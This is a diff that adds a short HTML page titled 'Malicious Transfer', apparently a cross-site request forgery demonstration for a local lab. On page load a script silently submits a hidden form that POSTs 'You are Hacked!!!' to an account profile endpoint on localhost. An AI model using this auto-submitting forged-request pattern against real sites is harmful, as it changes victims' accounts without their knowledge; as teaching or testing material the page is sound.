@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <head>
+	<title>Malicious Transfer</title>
+  </head>
+  <body>
+
+    <iframe name="innerFrame"></iframe>
+
+    <form action="http://localhost:8080/account" method="POST" target="innerFrame">
+      <input name="profile" value="You are Hacked!!!">
+    </form>
+
+    <script>
+      document.querySelector("form").submit();
+    </script>
+
+  </body>
+</html>
